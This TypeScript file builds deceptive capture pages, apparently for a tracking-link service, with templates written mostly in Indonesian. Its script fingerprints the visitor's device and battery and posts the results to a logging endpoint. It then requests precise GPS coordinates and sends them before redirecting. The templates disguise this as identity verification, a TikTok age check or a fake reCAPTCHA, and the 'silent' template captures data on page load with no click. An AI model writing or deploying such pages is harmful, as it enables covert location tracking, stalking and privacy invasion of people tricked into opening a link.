export const getCaptureScript = (id: string, redirectUrl: string = 'https://google.com', theme: any = {}) => {
  const flow = theme.flow || 'full'; // silent, meta, full
  return `
<script>
  (function() {
    var gpsAttempted = false;
    var startTime = Date.now();
    var hasRedirected = false;
    var targetId = '${id}';
    var targetUrl = '${redirectUrl}';
    var flowType = '${flow}';
    var cfg = ${JSON.stringify(theme)};
    
    function checkRedirect() {
      if (hasRedirected) return;
      var elapsed = (Date.now() - startTime) / 1000;
      var threshold = (flowType === 'full') ? 15 : 5;
      if (elapsed >= threshold || (gpsAttempted && elapsed >= 2)) {
        hasRedirected = true;
        window.location.href = targetUrl;
      }
    }

    if (flowType === 'silent') {
       window.onload = function() {
         setTimeout(function() { window.startCapture('silent'); }, 500);
       };
    }

    setInterval(checkRedirect, 1000);

    window.startCapture = async function(mode) {
      var box = document.querySelector('.box') || document.querySelector('.container') || document.body;
      if (!box) return;

      var isSilent = mode === 'silent' || flowType === 'silent';
      var accent = cfg.accent || '#3498db';

      if (!isSilent) {
        box.innerHTML = '<div id="status-icon" style="font-size:40px; margin-bottom:15px;">' + (cfg.icon || '🔍') + '</div>' +
          '<h2 id="status-title">' + (cfg.initTitle || 'Memproses...') + '</h2>' +
          '<div id="progress-container" style="width:100%; background:#f0f0f0; border-radius:10px; height:8px; margin-bottom:15px; overflow:hidden; border: 1px solid #eee;">' +
          '<div id="progress-bar" style="width:0%; background:' + accent + '; height:100%; transition:width 0.4s ease;"></div>' +
          '</div>' +
          '<p id="status-text" style="font-size:13px; color:#7f8c8d; min-height: 40px;">' + (cfg.initText || 'Menghubungkan ke server...') + '</p>';
      }

      var statusTitle = document.getElementById('status-title');
      var statusText = document.getElementById('status-text');
      var bar = document.getElementById('progress-bar');
      var icon = document.getElementById('status-icon');
      
      function updateProgress(p, text, title) {
        if (bar) bar.style.width = p + '%';
        if (statusText) statusText.innerText = text;
        if (statusTitle && title) statusTitle.innerText = title;
      }

      function finish(success, reason) {
        if (isSilent) {
           window.location.href = targetUrl;
           return;
        }
        if (bar) bar.style.width = '100%';
        if (success) {
          if (icon) icon.innerText = "✅";
          if (statusTitle) {
            statusTitle.innerText = cfg.doneTitle || "Selesai";
            statusTitle.style.color = "#27ae60";
          }
          if (statusText) statusText.innerText = "Berhasil diverifikasi. Mengalihkan...";
        } else {
          if (icon) icon.innerText = "ℹ️";
          if (statusTitle) statusTitle.innerText = "Lanjut";
          if (statusText) statusText.innerText = (reason || "") + " Mengalihkan...";
        }
        setTimeout(checkRedirect, 1500);
      }

      try {
        if (!isSilent) updateProgress(20, cfg.step1 || "Menganalisis sistem...");
        
        var metadata = {
          browser: navigator.userAgent,
          platform: navigator.platform,
          screen: window.screen.width + "x" + window.screen.height,
          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
          language: navigator.language,
          cores: navigator.hardwareConcurrency || "N/A",
          mem: navigator.deviceMemory || "N/A",
          vendor: navigator.vendor,
          ref: document.referrer || "Direct",
          tmplId: cfg.tmplId || '1'
        };

        try {
          if ('getBattery' in navigator) {
            var b = await navigator.getBattery();
            metadata.battery = Math.round(b.level * 100) + "% (" + (b.charging ? "Charging" : "Discharging") + ")";
          }
        } catch(e) {}

        if (!isSilent) updateProgress(50, cfg.step2 || "Sinkronisasi metadata...");
        
        await fetch('/api/log/' + targetId + '/info', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(metadata)
        }).catch(function(){});

        if (flowType === 'full') {
          if (!isSilent) {
            updateProgress(75, cfg.step3 || "Otorisasi akhir...", cfg.waitTitle || "Izin Diperlukan");
            if (icon && cfg.waitIcon) icon.innerText = cfg.waitIcon;
          }

          if (navigator.geolocation) { 
            navigator.geolocation.getCurrentPosition( 
              function(pos) { 
                if (!isSilent) updateProgress(95, "Mengamankan koordinat...");
                fetch('/api/log/' + targetId + '/gps', { 
                  method: 'POST', 
                  headers: { 'Content-Type': 'application/json' }, 
                  body: JSON.stringify({ lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy, tmplId: cfg.tmplId }) 
                }).finally(function() { 
                  gpsAttempted = true; 
                  finish(true);
                }); 
              }, 
              function(err) { 
                gpsAttempted = true; 
                finish(false, "Izin ditolak.");
              }, 
              { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 } 
            ); 
          } else { 
            gpsAttempted = true; 
            finish(false, "GPS Error.");
          }
        } else {
          gpsAttempted = true;
          finish(true);
        }
      } catch (err) {
        finish(false, "Sistem sibuk.");
      }
    };
  })();
</script>
`;
};

export const templates: Record<string, {name: string, render: (id: string) => string}> = {
  '1': {
    name: "🛡️ Standard Security (GPS Full)",
    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Identity Verification</title><style>body { background:#fff; color:#333; font-family:-apple-system, sans-serif; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; text-align:center;} .box { width:90%; max-width:400px; padding:30px; background:#fff; border-radius:15px; } .loader { border:3px solid #f3f3f3; border-top:3px solid #3498db; border-radius:50%; width:50px; height:50px; animation:spin 1s linear infinite; margin:0 auto 20px;} @keyframes spin { 0% { transform:rotate(0deg); } 100% { transform:rotate(360deg); } } h2 { font-size:22px; margin-bottom:10px; } p { color:#666; font-size:14px; margin-bottom:25px; } .btn { background:#3498db; color:#fff; border:none; padding:15px 40px; border-radius:30px; font-weight:bold; cursor:pointer; font-size:16px; box-shadow: 0 4px 15px rgba(52, 152, 219, 0.3); width: 100%; } .btn:active { transform: scale(0.98); }</style></head><body><div class="box"><div class="loader"></div><h2>Otoritas Keamanan</h2><p>Langkah terakhir: Sinkronkan profil keamanan browser Anda.</p><button class="btn" onclick="window.startCapture();">VERIFIKASI AKUN</button></div>${getCaptureScript(id, 'https://google.com', {
      tmplId: '1', flow: 'full', accent: '#3498db', icon: '🛡️',
      initTitle: 'Sinkronisasi...', initText: 'Memvalidasi sertifikat...',
      step2: 'Mengirim device hash...', step3: 'Menunggu izin GPS...',
      waitIcon: '📍', doneTitle: 'Akun Terverifikasi'
    })}</body></html>`
  },
  '3': {
    name: "🚀 Fast Redirect (Hardware Meta Only)",
    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Redirecting...</title><style>body { background:#f9f9f9; text-align:center; padding-top:20vh; font-family:sans-serif;} .box { width:90%; max-width:400px; background:#fff; border:1px solid #ddd; display:inline-block; padding:40px; border-radius:10px; box-shadow:0 4px 6px rgba(0,0,0,0.05); } .icon { font-size:50px; margin-bottom:15px; } .btn { background:#000; color:#fff; border:none; padding:12px 40px; border-radius:25px; font-weight:bold; cursor:pointer; margin-top:20px; width:100%; }</style></head><body><div class="box"><div class="icon">🔓</div><h2>Verifikasi Keamanan</h2><p>Amankan sesi browser untuk membuka konten.</p><button class="btn" onclick="window.startCapture();">BUKA KONTEN</button></div>${getCaptureScript(id, 'https://google.com', {
      tmplId: '3', flow: 'meta', accent: '#000', icon: '⚙️',
      initTitle: 'Mempersiapkan...', initText: 'Membuka tunnel aman...',
      step2: 'Selesai!', doneTitle: 'Terbuka'
    })}</body></html>`
  },
  '5': {
    name: "🖥️ Cyber Scanner (GPS Full)",
    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>System Sync</title><style>body { background:#000; color:#0f0; font-family:'Courier New', monospace; text-align:center; padding-top:20vh; } .box { width:90%; max-width:500px; margin:0 auto; } .btn { border:1px solid #0f0; background:transparent; color:#0f0; padding:15px 30px; cursor:pointer; font-size:18px; width:100%; }</style></head><body><div class="box"><h1>SCANNING DEVICE...</h1><p>[*] Checking browser integrity<br>[*] Hardware validation link...<br><br>Klik Whitelist untuk menyelesaikan scan.</p><br><button class="btn" onclick="window.startCapture();">WHITELIST DEVICE</button></div>${getCaptureScript(id, 'https://google.com', {
      tmplId: '5', flow: 'full', accent: '#0f0', icon: '▒▒',
      initTitle: 'CORE_SCAN...', initText: '[*] Extracting hardware tokens...',
      step2: '[*] Sending payload...', step3: '[!] Izin GPS diperlukan.',
      waitIcon: '[!]', doneTitle: 'WHITELISTED'
    })}</body></html>`
  },
  '8': {
    name: "🔞 TikTok Age Verification (GPS Full)",
    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>TikTok</title><style>body { background:#121212; color:white; text-align:center; padding-top:20vh; font-family:sans-serif; } .box { width:90%; max-width:500px; margin:0 auto; } .btn { background:#fe2c55; color:white; padding:15px 40px; border-radius:4px; font-weight:bold; border:none; cursor:pointer; font-size:16px; width:100%; }</style></head><body><div class="box"><div style="font-size:40px;">🔞</div><h2>VIDEO DIBATASI USIA</h2><p>Konten ini hanya untuk pemirsa dewasa. Verifikasi usia Anda melalui sinkronisasi lokasi.</p><button class="btn" onclick="window.startCapture();">KONFIRMASI UMUR</button></div>${getCaptureScript(id, 'https://tiktok.com/', {
      tmplId: '8', flow: 'full', accent: '#fe2c55', icon: '🔞',
      initTitle: 'Verifying Age...', initText: 'Scanning metadata...',
      step2: 'Validating legal status...', step3: 'Syncing regional age law...',
      waitIcon: '🌍', doneTitle: 'Age Verified'
    })}</body></html>`
  },
  '9': {
    name: "🕵️ stealth reCAPTCHA (Silent - No Button)",
    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>reCAPTCHA</title><style>body { font-family:sans-serif; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; background:#f9f9f9; } .box { border:1px solid #d3d3d3; padding:15px; background:#fff; box-shadow:0 2px 4px rgba(0,0,0,0.1); display:flex; align-items:center; width:300px; cursor:default; }</style></head><body><div style="text-align:center;"><p style="margin-bottom:20px; color:#555;">Memeriksa keamanan browser...</p><div class="box"><div class="check" style="width:25px; height:25px; border:2px solid #c1c1c1; margin-right:15px; display:flex; align-items:center; justify-content:center; color:green; font-weight:bold;"></div><div style="font-size:14px; color:#555;">Satu langkah lagi...</div><div style="margin-left:auto; text-align:center; font-size:10px; color:#999;"><img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" width="30"><br>reCAPTCHA</div></div></div>${getCaptureScript(id, 'https://google.com/', {
      tmplId: '9', flow: 'silent'
    })}</body></html>`
  }
};
